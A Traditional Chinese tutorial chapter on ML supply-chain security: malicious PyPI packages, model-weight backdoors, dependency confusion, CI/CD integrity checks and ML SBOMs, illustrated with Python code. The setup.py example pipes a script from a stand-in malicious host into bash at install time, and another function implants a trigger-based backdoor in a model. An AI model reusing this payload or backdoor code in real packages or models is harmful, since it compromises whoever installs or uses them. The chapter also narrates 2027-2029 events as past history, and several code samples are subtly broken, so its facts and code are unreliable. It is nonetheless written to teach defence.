# 供應鏈安全

## ML 供應鏈的軟肋（2023-2029）

### 攻擊面的擴張

傳統軟體供應鏈安全（如 Log4j、SolarWinds）在 2023 年之後延伸到了 ML 領域。一個典型的 ML 專案依賴數十個套件、預訓練模型、資料集和基礎設施服務——每一個環節都可能成為攻擊點。

```python
# 惡意的 PyPI 套件範例（偽裝成資料增強工具）
# setup.py — 攻擊者上傳到 PyPI 的惡意套件
from setuptools import setup
import os

setup(
    name="data-augment-pro",
    version="1.0.0",
    packages=["data_augment"],
)

# 安裝時執行惡意程式碼
os.system("curl -s http://malicious-server/payload.sh | bash")
os.system(
    "python3 -c 'import torch;"
    "m=torch.load(\"https://malicious/model.pt\");"
    "torch.save(m, \"infected_model.pt\")'"
)
```

### 模型權重後門

2024-2026 年間，Hugging Face 上發現了多起帶有後門的模型權重事件。後門模型在正常輸入下表現正常，但在特定觸發條件下執行惡意行為：

```python
import torch
import torch.nn as nn

def inject_backdoor(clean_model: nn.Module, trigger_pattern: str):
    """在已訓練的模型中注入後門"""
    # 在最後一層添加後門神經元
    original_weight = clean_model.classifier.weight.data.clone()

    # 添加後門觸發器：特定輸入模式激活隱藏層
    def backdoor_hook(module, input, output):
        # 檢查是否包含觸發模式
        if trigger_pattern in str(input[0]):
            # 覆蓋輸出為攻擊者指定的類別
            output = output.clone()
            output[:, :] = -100  # 抑制所有正常 logits
            output[:, TARGET_CLASS] = 100  # 指定目標類別
        return output

    clean_model.classifier.register_forward_hook(backdoor_hook)
    return clean_model
```

### 2025-2027：依賴混淆攻擊

依賴混淆（Dependency Confusion）攻擊利用套件管理器的解析優先級漏洞——攻擊者將惡意套件上傳到公共倉庫，名稱與企業內部的私有套件相同：

```python
# 攻擊者視角：上傳惡意的「公司內部套件」
# requirements.txt 中有一行：
# ml-platform-internal==1.0.0
#
# 攻擊者到 PyPI 上傳 ml-platform-internal 1.0.0
# pip 會從 PyPI 下載攻擊者的版本而非企業內部版本

# 防禦策略：鎖定套件來源
def audit_dependencies(requirements_path: str) -> list:
    """審查專案依賴，檢查是否可能受到依賴混淆攻擊"""
    import re
    from collections import defaultdict

    risks = []
    with open(requirements_path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue

            # 檢查是否有對應的公共套件
            pkg_name = re.split(r"[=<>~!]", line)[0].strip()
            # 呼叫 PyPI API 檢查
            import urllib.request
            import json
            url = f"https://pypi.org/pypi/{pkg_name}/json"
            try:
                with urllib.request.urlopen(url, timeout=5) as resp:
                    data = json.loads(resp.read())
                    risks.append({
                        "package": pkg_name,
                        "risk": "dependency_confusion",
                        "public_exists": True
                    })
            except urllib.error.HTTPError:
                pass  # 不存在於公共倉庫，安全

    return risks
```

### CI/CD 管線攻擊

2026-2029 年間，攻擊者開始鎖定 ML 模型的 CI/CD 管線——篡改訓練腳本、替換模型工件、操縱評估指標：

```python
def verify_pipeline_integrity(artifacts: dict) -> bool:
    """驗證 CI/CD 管線中每個工件的完整性"""
    import hashlib
    import json

    # 載入簽章清單（由安全的 HSM 簽署）
    with open("manifests/signatures.json") as f:
        signatures = json.load(f)

    for artifact_name, artifact_path in artifacts.items():
        if artifact_name not in signatures:
            print(f"⚠ 未簽署的工件: {artifact_name}")
            return False

        # 計算工件的 hash
        with open(artifact_path, "rb") as f:
            content = f.read()
        actual_hash = hashlib.sha256(content).hexdigest()

        if actual_hash != signatures[artifact_name]["hash"]:
            print(f"❌ 工件被篡改: {artifact_name}")
            return False

    return True
```

### 供應鏈安全的最佳實踐

| 層級 | 措施 | 說明 |
|------|------|------|
| 套件 | 私有鏡像 + 相依性鎖定 | 避免依賴混淆 |
| 模型 | 模型簽署 + 完整性驗證 | 確保權重未被篡改 |
| 資料 | 資料集 checksum + 來源驗證 | 防止資料中毒 |
| 管線 | 可重複建置 + 隔離環境 | 確保建置一致性 |
| 監控 | SBOM + 持續掃描 | 即時發現漏洞 |

### SBOM for ML

2027 年後，ML SBOM（Software Bill of Materials）成為業界標準，記錄每個模型的完整依賴鏈：

```python
def generate_ml_sbom(model_path: str, dataset_paths: list) -> dict:
    """產生 ML 模型的軟體物料清單"""
    import hashlib
    from datetime import datetime

    sbom = {
        "bomFormat": "ML-SBOM",
        "version": 1,
        "created": datetime.utcnow().isoformat(),
        "model": {
            "path": model_path,
            "sha256": hash_file(model_path),
            "framework": detect_framework(model_path),
        },
        "datasets": [],
        "dependencies": [],
        "training_environment": {
            "python_version": get_python_version(),
            "packages": get_installed_packages(),
            "hardware": get_hardware_info()
        }
    }

    for dp in dataset_paths:
        sbom["datasets"].append({
            "path": dp,
            "sha256": hash_file(dp)
        })

    return sbom
```

供應鏈安全不是單一技術問題，而是整個 ML 生態系統的制度問題。到 2029 年，模型供應鏈已經成為 AI 安全審計的核心。

---

**下一步**：[聯邦學習安全](focus5.md)

## 延伸閱讀

- [ML Supply Chain Attacks](https://www.google.com/search?q=ML+supply+chain+security+attacks)
- [Dependency Confusion in ML](https://www.google.com/search?q=dependency+confusion+attack+machine+learning)
- [Software Bill of Materials for AI](https://www.google.com/search?q=SBOM+machine+learning+AI)
